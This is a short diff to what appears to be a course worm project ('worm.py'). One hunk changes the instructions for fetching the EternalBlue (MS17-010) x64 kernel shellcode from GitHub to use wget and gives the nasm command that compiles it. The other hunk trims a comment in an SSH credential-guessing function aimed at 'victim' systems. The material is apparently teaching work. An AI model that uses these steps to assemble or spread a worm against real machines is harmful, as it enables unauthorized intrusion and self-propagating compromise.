@@ -20,7 +20,7 @@ python worm.py sc_x64.bin
 Construct Payload for Windows x64 (Ref: https://root4loot.com/post/eternalblue_manual_exploit/)
 -------------------------------------------------------------------------------------------------
 Obtaining the shellcode
-git clone https://raw.githubusercontent.com/worawit/MS17-010/master/shellcode/eternalblue_kshellcode_x64.asm
+wget https://raw.githubusercontent.com/worawit/MS17-010/master/shellcode/eternalblue_kshellcode_x64.asm
 
 Compiling the shellcode
 nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin
@@ -206,13 +206,7 @@ def tryCredentials( host, userName, password, sshClient ):
 	# Otherwise, it opens a connection
 	# to the victim system; sshClient now 
 	# represents an SSH connection to the 
-	# victim. Most of the code here will
-	# be almost identical to what we did
-	# during class exercise. Please make
-	# sure you return the values as specified
-	# in the comments above the function
-	# declaration (if you choose to use
-	# this skeleton).
+	# victim.
 	return 0
 
 
